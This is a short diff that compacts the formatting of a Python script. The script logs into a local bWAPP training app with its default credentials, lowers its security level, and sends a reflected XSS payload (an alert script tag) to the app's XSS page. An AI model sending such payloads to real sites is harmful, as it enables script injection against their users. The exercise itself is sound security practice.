@@ -10,11 +10,7 @@ s = requests.Session()
 
 # Step 1: Login
 print("[*] Logging into bWAPP...")
-login_data = {
-    "login": "bee",
-    "password": "bug",
-    "form": "submit"
-}
+login_data = {"login": "bee", "password": "bug", "form": "submit"}
 resp = s.post(LOGIN_URL, data=login_data)
 if "Welcome" not in resp.text:
     print("[-] Login failed")
@@ -24,18 +20,13 @@ print("[+] Logged in successfully!")
 
 # Step 2: Set security level to low
 print("[*] Setting security level to low...")
-security_data = {
-    "security": "low",
-    "form": "submit"
-}
+security_data = {"security": "low", "form": "submit"}
 s.post("http://localhost:8080/bWAPP/security.php", data=security_data)
 
 # Step 3: Access the Reflected XSS page and send payload
 print("[*] Sending XSS payload to Reflected (GET) page...")
 payload = "<script>alert('XSS')</script>"
-xss_data = {
-    "name": payload
-}
+xss_data = {"name": payload}
 xss_url = f"{XSS_URL}?name={payload}"
 resp = s.get(xss_url)
 
